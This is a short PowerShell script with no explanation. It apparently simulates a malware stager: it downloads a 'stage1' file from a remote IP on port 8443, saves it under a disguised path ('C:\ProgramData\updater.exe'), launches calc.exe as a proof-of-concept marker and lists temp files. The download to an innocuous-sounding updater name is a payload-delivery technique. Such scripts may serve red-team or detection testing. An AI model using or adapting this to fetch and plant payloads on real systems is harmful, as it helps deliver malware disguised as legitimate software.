[CmdletBinding()]
param(
    [string]$Stage1Url = "https://192.0.2.207:8443/stage1.ps1",
    [string]$PayloadPath = "C:\ProgramData\updater.exe",
    [int]$TimeoutSec = 100
)
Invoke-WebRequest -Uri $Stage1Url -OutFile $PayloadPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
